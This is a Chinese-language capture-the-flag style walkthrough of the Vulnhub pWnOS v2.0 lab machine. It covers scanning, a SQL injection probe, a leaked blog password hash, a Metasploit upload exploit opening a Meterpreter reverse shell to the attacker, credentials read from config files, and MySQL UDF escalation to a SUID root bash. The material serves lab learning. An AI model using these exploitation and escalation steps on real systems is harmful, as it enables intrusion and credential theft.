---
title: Vulnhub-pWnOS v2 0
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# pWnOS v2.0

> [https://www.vulnhub.com/entry/pwnos-20-pre-release,34/](https://www.vulnhub.com/entry/pwnos-20-pre-release,34/)
> 

## 主机发现端口扫描

1. 探测存活主机，`150`为靶机
    
    ```php
    nmap -sP 192.168.75.0/24
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-24 12:44 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00013s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00015s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.150
    Host is up (0.00030s latency).
    MAC Address: 00:0C:29:5D:85:45 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00010s latency).
    MAC Address: 00:50:56:FB:E7:F4 (VMware)
    Nmap scan report for 192.168.75.131
    Host is up.
    ```
    
2. 扫描主机所有端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.150   
    //                 
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-24 12:48 CST
    Nmap scan report for 192.168.75.150
    Host is up (0.00027s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:5D:85:45 (VMware)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sT -sV -O -p22,80  192.168.75.150 
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-24 12:49 CST
    Nmap scan report for 192.168.75.150
    Host is up (0.00046s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
    MAC Address: 00:0C:29:5D:85:45 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.32 - 2.6.39
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```sql
    nmap -script=vuln -p22,80  192.168.75.150 
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-24 12:50 CST
    Nmap scan report for 192.168.75.150
    Host is up (0.00044s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |       httponly flag not set
    |   /login.php: 
    |     PHPSESSID: 
    |       httponly flag not set
    |   /login/: 
    |     PHPSESSID: 
    |       httponly flag not set
    |   /index/: 
    |     PHPSESSID: 
    |       httponly flag not set
    |   /register/: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.150
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.150:80/login.php
    |     Form id: 
    |     Form action: login.php
    |     
    |     Path: http://192.168.75.150:80/register.php
    |     Form id: 
    |_    Form action: register.php
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /blog/: Blog
    |   /login.php: Possible admin folder
    |   /login/: Login page
    |   /info.php: Possible information file
    |   /icons/: Potentially interesting folder w/ directory listing
    |   /includes/: Potentially interesting directory w/ listing on 'apache/2.2.17 (ubuntu)'
    |   /index/: Potentially interesting folder
    |   /info/: Potentially interesting folder
    |_  /register/: Potentially interesting folder
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    MAC Address: 00:0C:29:5D:85:45 (VMware)
    ```
    
    难得发现疑似`csrf` ，但在靶机上用处好像不大，还发现了一些可能感兴趣的路径
    

## web渗透

1. 扫描目录
    
    ```sql
    dirsearch -u 192.168.75.150 -x 403
    [13:08:27] Starting:                                                                                                            
    [13:08:36] 302 -   20B  - /activate  ->  http://10.10.10.100/index.php      
    [13:08:48] 301 -  248B  - /blog  ->  http://192.168.75.150/blog/            
    [13:08:49] 200 -    2KB - /blog/                                            
    [13:09:01] 301 -  251B  - /includes  ->  http://192.168.75.150/includes/    
    [13:09:01] 200 -  546B  - /includes/
    [13:09:02] 200 -    9KB - /info                                             
    [13:09:02] 200 -    9KB - /info.php
    [13:09:05] 200 -  629B  - /login                                            
    [13:09:05] 200 -  629B  - /login.php                                        
    [13:09:05] 200 -  629B  - /login/super                                      
    [13:09:05] 200 -  629B  - /login/                                           
    [13:09:05] 200 -  629B  - /login/cpanel.aspx                                
    [13:09:05] 200 -  629B  - /login/admin/
    [13:09:05] 200 -  629B  - /login/cpanel.php
    [13:09:05] 200 -  629B  - /login/cpanel.js
    [13:09:05] 200 -  629B  - /login/cpanel.html
    [13:09:05] 200 -  629B  - /login/login
    [13:09:05] 200 -  629B  - /login/oauth/                                     
    [13:09:05] 200 -  629B  - /login/admin/admin.asp                            
    [13:09:05] 200 -  629B  - /login/cpanel.jsp                                 
    [13:09:05] 200 -  629B  - /login/index
    [13:09:05] 200 -  629B  - /login/administrator/                             
    [13:09:05] 200 -  629B  - /login/cpanel/
    [13:09:18] 200 -  723B  - /register.php                                     
    [13:09:18] 200 -  723B  - /register            
    ```
    
2. 访问敏感目录
    - `/blog/` blog博客页面
    - `/blog/login.php` blog登陆页面
    - `/info.php` phpinfo
    
    都是注册或者登陆界面
    
3. `/index.php`泄露了管理员邮箱尝试弱密码爆破`admin@isints.com` ，爆破失败
    - 在`/login.php`界面尝试`sql`注入，在**`Email Address`** 后面加`'` 爆出sql语句
        
        ```sql
        admin@isints.com'
        ```
        
        ```sql
        An error occurred in script '/var/www/login.php' on line 47: Query: SELECT * FROM users WHERE email='admin@isints.com'' AND pass='356a192b7913b04c54574d18c28d46e6395428ab' AND active IS NULL 
        ```
        
    - 加上`#`号闭合语句让语句为真
        
        ```sql
        email=admin@isints.com'#&pass=1&submit=Login&submitted=TRUE
        ```
        
        提示：`WAF: SQL Injection Attack Detected. Details Logged. Denying Session. Goodbye!` 被WAF阻止了，换路子
        
4. 尝试寻找`/blog/` 的漏洞
    - 打开`F12`，看看能不能查到是什么CMS，找到 `Simple PHP Blog 0.4.0` 可能就是CMS的名称
    - 网上查阅`Simple PHP Blog 0.4.0` 的漏洞
        
        敏感文件泄露：https://github.com/advisories/GHSA-p35h-cp5r-m46j ，在`/blog/config/` 泄露了`password.txt` 获得密码 `$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/` 使用 hash-identifier 识别不到
        
    - 使用`msf`查找是否存在漏洞
        
        ```sql
        msf6 > search simple php blog
        //
        Matching Modules
        ================
        
           #  Name                                      Disclosure Date  Rank       Check  Description
           -  ----                                      ---------------  ----       -----  -----------
           0  exploit/unix/webapp/sphpblog_file_upload  2005-08-25       excellent  Yes    Simple PHP Blog Remote Command Execution
        ```
        
        存在，使用该`exploit`模块
        
        ```sql
        msf6 > use exploit/unix/webapp/sphpblog_file_upload //使用该模块
        [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
        msf6 exploit(unix/webapp/sphpblog_file_upload) > show options //查看该模块需要配置什么
        
        Module options (exploit/unix/webapp/sphpblog_file_upload):
        
           Name     Current Setting  Required  Description
           ----     ---------------  --------  -----------
           Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
           RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                               metasploit.html
           RPORT    80               yes       The target port (TCP)
           SSL      false            no        Negotiate SSL/TLS for outgoing connections
           URI      /sphpblog        yes       Sphpblog directory path
           VHOST                     no        HTTP server virtual host
        
        Payload options (php/meterpreter/reverse_tcp):
        
           Name   Current Setting  Required  Description
           ----   ---------------  --------  -----------
           LHOST  192.168.75.151   yes       The listen address (an interface may be specified)
           LPORT  4444             yes       The listen port
        
        Exploit target:
        
           Id  Name
           --  ----
           0   Automatic
        
        View the full module info with the info, or info -d command.
        
        msf6 exploit(unix/webapp/sphpblog_file_upload) > set rhosts 192.168.75.150 //靶机ip
        rhosts => 192.168.75.150
        msf6 exploit(unix/webapp/sphpblog_file_upload) > set rport 80  //靶机端口
        rport => 80
        msf6 exploit(unix/webapp/sphpblog_file_upload) > set uri /blog/ //攻击目录
        uri => /blog/
        msf6 exploit(unix/webapp/sphpblog_file_upload) > exploit //启动攻击
        
        [*] Started reverse TCP handler on 192.168.75.151:4444 
        [+] Successfully retrieved hash: $1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/
        [+] Successfully removed /config/password.txt
        [+] Successfully created temporary account.
        [+] Successfully logged in as OTmoxq:ykM0Fg
        [+] Successfully retrieved cookie: ii9ppvao0fveedft2314so41u3
        [+] Successfully uploaded pVmL1BgOJLbmlN8mucTA.php
        [+] Successfully uploaded gy904amvE6YvJp3W7xkC.php
        [+] Successfully reset original password hash.
        [+] Successfully removed /images/pVmL1BgOJLbmlN8mucTA.php
        [*] Calling payload: /images/gy904amvE6YvJp3W7xkC.php
        [*] Sending stage (39927 bytes) to 192.168.75.150
        [*] Meterpreter session 1 opened (192.168.75.151:4444 -> 192.168.75.150:42500) at 2024-09-24 18:01:33 +0800
        [+] Successfully removed /images/gy904amvE6YvJp3W7xkC.php
        meterpreter > 
        ```
        
        攻击成功，输入`shell`以获得靶机`shell`
        
        ```sql
        meterpreter > shell
        Process 1680 created.
        Channel 0 created.
        sh: getcwd() failed: No such file or directory
        sh: getcwd() failed: No such file or directory
        
        python -c "import pty;pty.spawn('/bin/bash')" //获得交互性更好的shell
        shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
        www-data@web:$ 
        ```
        
        获得`www-data`的`shell`
        

## 提权

1. 查看权限
    
    ```sql
    www-data@web:$ whoami
    www-data
    //
    www-data@web:$ uname -a
    Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
    //
    www-data@web:$ ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:5d:85:45 brd ff:ff:ff:ff:ff:ff
        inet 192.168.75.150/24 brd 192.168.75.255 scope global eth0
        inet6 fe80::20c:29ff:fe5d:8545/64 scope link 
           valid_lft forever preferred_lft forever
    //
    www-data@web:$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    
2. 信息收集
    - 获取数据库连接配置文件，获得数据库用户`root`，密码`goodday`
        
        ```sql
        www-data@web:/var/www$ cat mysqli_connect.php 
        <?php # Script 8.2 - mysqli_connect.php
        
        // This file contains the database access information.
        // This file also establishes a connection to MySQL
        // and selects the database.
        
        // Set the database access information as constants:
        
        DEFINE ('DB_USER', 'root');
        DEFINE ('DB_PASSWORD', 'goodday');
        DEFINE ('DB_HOST', 'localhost');
        DEFINE ('DB_NAME', 'ch16');
        
        // Make the connection:
        
        $dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );
        ```
        
    - 尝试登录，登陆失败，继续寻找mysql连接配置文件
        
        根据上面发现的连接配置的文件来寻找
        
        ```sql
        www-data@web:/var/www$ find / -name '*mysqli_connect*' 2>/dev/null
        /var/mysqli_connect.php
        /var/www/mysqli_connect.php
        ```
        
        ```sql
        www-data@web:/var/www$ cat /var/mysqli_connect.php 
        <?php # Script 8.2 - mysqli_connect.php
        
        // This file contains the database access information.
        // This file also establishes a connection to MySQL
        // and selects the database.
        // Set the database access information as constants:
        
        DEFINE ('DB_USER', 'root');
        DEFINE ('DB_PASSWORD', 'root@ISIntS');
        DEFINE ('DB_HOST', 'localhost');
        DEFINE ('DB_NAME', 'ch16');
        
        // Make the connection:
        $dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );
        ?>
        ```
        
        获得密码`root@ISIntS` ，尝试登陆成功
        
    - 查询数据，发现一个用户`Dan` ，尝试`ssh`登录
        
        ```sql
        mysql> select * from users;
        select * from users;
        +---------+------------+-----------+------------------+------------------------------------------+------------+----------------------------------+---------------------+
        | user_id | first_name | last_name | email            | pass                                     | user_level | active                           | registration_date   |
        +---------+------------+-----------+------------------+------------------------------------------+------------+----------------------------------+---------------------+
        |       1 | Dan        | Privett   | admin@isints.com | c2c4b4e51d9e23c02c15702c136c3e950ba9a4af |          0 | NULL                             | 2011-05-07 17:27:01 |
        +---------+------------+-----------+------------------+------------------------------------------+------------+----------------------------------+---------------------+
        2 rows in set (0.00 sec)
        ```
        
    - 破译密码得：`killerbeesareflying` ，ssh尝试登陆失败，密码是错的
    - 因为我们有数据库root权限，所以可以尝试UDF提权
        
        查看`secure_priv`权限 ，符合要求
        
        ```sql
        mysql> SHOW VARIABLES LIKE "secure_file_priv";
        SHOW VARIABLES LIKE "secure_file_priv";
        +------------------+-------+
        | Variable_name    | Value |
        +------------------+-------+
        | secure_file_priv |       |
        +------------------+-------+
        ```
        
        查看plugin路径，存放在 `/usr/lib/mysql/plugin`
        
        ```sql
        mysql> show variables like '%plugin%';                
        show variables like '%plugin%';
        +---------------+-----------------------+
        | Variable_name | Value                 |
        +---------------+-----------------------+
        | plugin_dir    | /usr/lib/mysql/plugin |
        +---------------+-----------------------+
        ```
        
        动态链接库存放在kali 的`/usr/share/metasploit-framework/data/exploits/mysql` 下，将动态链接库文件传到靶机的`/tmp`文件夹
        
        ```sql
        cd /usr/share/metasploit-framework/data/exploits/mysql
        // 选择版本传到靶机
        lib_mysqludf_sys_32.dll  
        lib_mysqludf_sys_64.dll
        lib_mysqludf_sys_32.so   
        lib_mysqludf_sys_64.so
        ```
        
        将动态链接库传入到plugin路径
        
        ```sql
        mysql> use mysql;
        
        mysql> create table foo(line blob);
        Query OK, 0 rows affected (0.00 sec)
        
        mysql> insert into foo values (load_file('/tmp/lib_mysqludf_sys_64.so'))
        Query OK, 1 row affected (0.00 sec)
        
        mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/udf.so';
        Query OK, 1 row affected (0.00 sec)
        
        mysql> create function sys_eval returns string soname 'udf.so';
        Query OK, 0 rows affected (0.00 sec)
        
        mysql> select * from mysql.func; 
        +----------+-----+--------+----------+
        | name     | ret | dl     | type     |
        +----------+-----+--------+----------+
        | sys_eval |   2 | udf.so | function |
        +----------+-----+--------+----------+
        
        mysql> select sys_eval('whoami'); // 函数存在root函数
        +--------------------+
        | sys_eval('whoami') |
        +--------------------+
        | root               |
        +--------------------+
        ```
        
3. 提权
    - 创建用户自定义函数后，函数获得root权限，通过函数来获得`root`的`shell`
        
        ```sql
        mysql> select sys_eval('cp /bin/bash /tmp/binbash; chmod +xs /tmp/binbash');
        +---------------------------------------------------------------+
        | sys_eval('cp /bin/bash /tmp/binbash; chmod +xs /tmp/binbash') |
        +---------------------------------------------------------------+
        | NULL                                                          |
        +---------------------------------------------------------------+
        ```
        
        - `cp /bin/bash /tmp/binbash`：将 `/bin/bash` 文件复制到 `/tmp` 目录，并命名为 `binbash`。
        - `chmod +xs /tmp/binbash`：给复制的文件 `binbash` 设置 SUID 位，这样当用户执行该文件时，进程将以文件拥有者（通常是 root）的权限运行。
    - 获得shell
        
        ```sql
        www-data@web:/tmp$ /tmp/binbash -p
        //
        binbash-4.2# whoam
        root
        ```
        

## 思路

因为获得了数据库密码，并且是root用户，查看配置适合使用UDF